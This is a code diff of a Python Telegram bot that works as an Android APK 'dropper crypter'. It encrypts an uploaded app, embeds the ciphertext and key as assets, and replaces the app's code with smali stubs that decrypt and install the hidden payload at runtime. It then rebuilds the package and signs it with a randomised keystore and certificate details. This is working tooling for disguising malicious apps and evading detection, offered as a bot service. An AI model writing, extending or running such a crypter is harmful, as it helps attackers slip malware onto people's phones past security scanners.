@@ -3,7 +3,6 @@ from pathlib import Path
 from telegram import Update, Document
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-# Environment variables
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 ALLOWED_USERS = json.loads(os.getenv('ALLOWED_USERS', '[]'))
 WORK_DIR = os.getenv('WORK_DIR', '/tmp/work')
@@ -36,42 +35,8 @@ def run_cmd(cmd, timeout=300):
 def random_string(length=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
-# ---------------- Dropper Crypter Function ----------------
-def dropper_protect(input_apk: str, output_apk: str) -> bool:
-    ensure_dirs()
-    dec_dir = os.path.join(TEMP_DIR, 'dec_' + uuid.uuid4().hex[:6])
-    
-    # Step 1: Decode original APK
-    if not run_cmd(['apktool', 'd', '-f', '-o', dec_dir, input_apk], timeout=180):
-        return False
-
-    try:
-        # Step 2: Encrypt original APK and save as asset
-        encrypted_apk = os.path.join(TEMP_DIR, 'payload.enc')
-        key = os.urandom(16)
-        key_hex = base64.b16encode(key).decode().lower()
-        # Encrypt using openssl
-        if not run_cmd(['openssl', 'enc', '-aes-128-ecb', '-K', key_hex, '-in', input_apk, '-out', encrypted_apk], timeout=60):
-            return False
-
-        assets_dir = os.path.join(dec_dir, 'assets')
-        os.makedirs(assets_dir, exist_ok=True)
-        shutil.copy(encrypted_apk, os.path.join(assets_dir, 'payload.enc'))
-        # Save key as well (stub will read it)
-        with open(os.path.join(assets_dir, 'key.txt'), 'w') as f:
-            f.write(key_hex)
-
-        # Step 3: Remove original smali files (we will replace with stub)
-        for item in os.listdir(dec_dir):
-            if item.startswith('smali'):
-                shutil.rmtree(os.path.join(dec_dir, item), ignore_errors=True)
-
-        # Step 4: Create stub smali code that decrypts and installs the payload
-        stub_dir = os.path.join(dec_dir, 'smali', 'dropper')
-        os.makedirs(stub_dir, exist_ok=True)
-
-        # StubApp.smali (Application class)
-        stub_app = """\.class public Ldropper/StubApp;
+# --------------- Smali Strings (NO BACKSLASH before .) ---------------
+STUB_APP = """.class public Ldropper/StubApp;
 .super Landroid/app/Application;
 
 .method public onCreate()V
@@ -137,8 +102,8 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
     return-void
 .end method
 """
-        # Util.smali (helper functions)
-        stub_util = """\.class public Ldropper/Util;
+
+STUB_UTIL = """.class public Ldropper/Util;
 .super Ljava/lang/Object;
 
 .method public static readBytes(Ljava/io/InputStream;)[B
@@ -190,8 +155,7 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
     sget v0, Landroid/os/Build\$VERSION;->SDK_INT:I
     const/16 v1, 0x18
     if-lt v0, v1, :nougat
-    # Android 7+ uses FileProvider
-    const-string v2, "{package_name}.fileprovider"
+    const-string v2, "__PACKAGE__.fileprovider"
     invoke-static {p0, v2, p1}, Ldropper/Util;->getUriForFile(Landroid/content/Context;Ljava/lang/String;Ljava/io/File;)Landroid/net/Uri;
     move-result-object v2
     goto :pre_nougat
@@ -219,55 +183,90 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
 .end method
 """
 
+# ---------------- Dropper Crypter Function ----------------
+def dropper_protect(input_apk: str, output_apk: str) -> bool:
+    ensure_dirs()
+    dec_dir = os.path.join(TEMP_DIR, 'dec_' + uuid.uuid4().hex[:6])
+    rebuilt = os.path.join(TEMP_DIR, 'rebuilt.apk')
+    aligned = os.path.join(TEMP_DIR, 'aligned.apk')
+    encrypted_apk = os.path.join(TEMP_DIR, 'payload.enc')
+    ks_path = os.path.join(TEMP_DIR, 'rand.keystore')
+
+    # Decode original APK
+    if not run_cmd(['apktool', 'd', '-f', '-o', dec_dir, input_apk], timeout=180):
+        return False
+
+    try:
+        # Read original package name from manifest
+        manifest_path = os.path.join(dec_dir, 'AndroidManifest.xml')
+        import xml.etree.ElementTree as ET
+        tree = ET.parse(manifest_path)
+        root = tree.getroot()
+        package_name = root.attrib['package']
+
+        # Encrypt original APK
+        key = os.urandom(16)
+        key_hex = base64.b16encode(key).decode().lower()
+        if not run_cmd(['openssl', 'enc', '-aes-128-ecb', '-K', key_hex, '-in', input_apk, '-out', encrypted_apk], timeout=60):
+            return False
+
+        assets_dir = os.path.join(dec_dir, 'assets')
+        os.makedirs(assets_dir, exist_ok=True)
+        shutil.copy(encrypted_apk, os.path.join(assets_dir, 'payload.enc'))
+        with open(os.path.join(assets_dir, 'key.txt'), 'w') as f:
+            f.write(key_hex)
+
+        # Remove original smali folders
+        for item in os.listdir(dec_dir):
+            if item.startswith('smali'):
+                shutil.rmtree(os.path.join(dec_dir, item), ignore_errors=True)
+
+        # Create stub smali
+        stub_dir = os.path.join(dec_dir, 'smali', 'dropper')
+        os.makedirs(stub_dir, exist_ok=True)
+
         # Write stub files
         with open(os.path.join(stub_dir, 'StubApp.smali'), 'w') as f:
-            f.write(stub_app)
+            f.write(STUB_APP)
         with open(os.path.join(stub_dir, 'Util.smali'), 'w') as f:
-            f.write(stub_util)
+            # Replace placeholder with actual package name
+            util_content = STUB_UTIL.replace('__PACKAGE__', package_name)
+            f.write(util_content)
 
-        # Step 5: Modify AndroidManifest.xml to use StubApp as Application class
-        manifest_path = os.path.join(dec_dir, 'AndroidManifest.xml')
+        # Modify manifest to use StubApp
         with open(manifest_path, 'r', encoding='utf-8') as f:
             manifest = f.read()
-        # Replace <application ... > with <application android:name="dropper.StubApp" ...>
         manifest = manifest.replace('<application', '<application android:name="dropper.StubApp"')
-        # Add FileProvider for Nougat+ (optional but safe)
-        if '<provider' not in manifest:
-            provider_entry = '''
+        # Add FileProvider inside <application>
+        provider_entry = '''
         <provider
             android:name="androidx.core.content.FileProvider"
-            android:authorities="{package_name}.fileprovider"
+            android:authorities="''' + package_name + '''.fileprovider"
             android:exported="false"
             android:grantUriPermissions="true">
             <meta-data
                 android:name="android.support.FILE_PROVIDER_PATHS"
                 android:resource="@xml/file_paths" />
         </provider>'''
-            manifest = manifest.replace('</application>', provider_entry + '\n    </application>')
+        manifest = manifest.replace('</application>', provider_entry + '\n    </application>')
         with open(manifest_path, 'w', encoding='utf-8') as f:
             f.write(manifest)
 
-        # Also need file_paths.xml resource (create res/xml folder)
+        # Create file_paths.xml
         xml_dir = os.path.join(dec_dir, 'res', 'xml')
         os.makedirs(xml_dir, exist_ok=True)
         with open(os.path.join(xml_dir, 'file_paths.xml'), 'w') as f:
-            f.write('''<?xml version="1.0" encoding="utf-8"?>
-<paths>
-    <files-path name="internal" path="." />
-</paths>''')
+            f.write('<?xml version="1.0" encoding="utf-8"?>\n<paths>\n    <files-path name="internal" path="." />\n</paths>')
 
-        # Step 6: Rebuild APK
-        rebuilt = os.path.join(TEMP_DIR, 'rebuilt.apk')
+        # Rebuild APK
         if not run_cmd(['apktool', 'b', '-o', rebuilt, dec_dir], timeout=180):
             return False
 
-        # Step 7: Zipalign
-        aligned = os.path.join(TEMP_DIR, 'aligned.apk')
+        # Zipalign
         if not run_cmd(['zipalign', '-v', '-p', '4', rebuilt, aligned], timeout=60):
             return False
 
-        # Step 8: Generate random keystore and sign
-        ks_path = os.path.join(TEMP_DIR, 'rand.keystore')
+        # Generate random keystore and sign
         ks_pass = random_string(12)
         alias = random_string(6)
         dname = f"CN={random_string(5)}, OU={random_string(4)}, O={random_string(5)}, L={random_string(6)}, ST={random_string(4)}, C={random.choice(['US','GB','IN'])}"
@@ -286,7 +285,7 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
             try: os.remove(f)
             except: pass
 
-# ---------------- Telegram Handlers ----------------
+# ... Telegram handlers unchanged ...
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_allowed(update.effective_user.id):
         await update.message.reply_text("Access denied.")
@@ -302,7 +301,7 @@ async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not doc.file_name or not doc.file_name.lower().endswith(".apk"):
         await update.message.reply_text("Only APK accepted.")
         return
-    await update.message.reply_text("Processing with crypter... (may take 2 min)")
+    await update.message.reply_text("Processing with crypter... (max 2 min)")
     fin = os.path.join(WORK_DIR, f"{uid}_{doc.file_name}")
     await (await doc.get_file()).download_to_drive(fin)
     base, ext = os.path.splitext(doc.file_name)
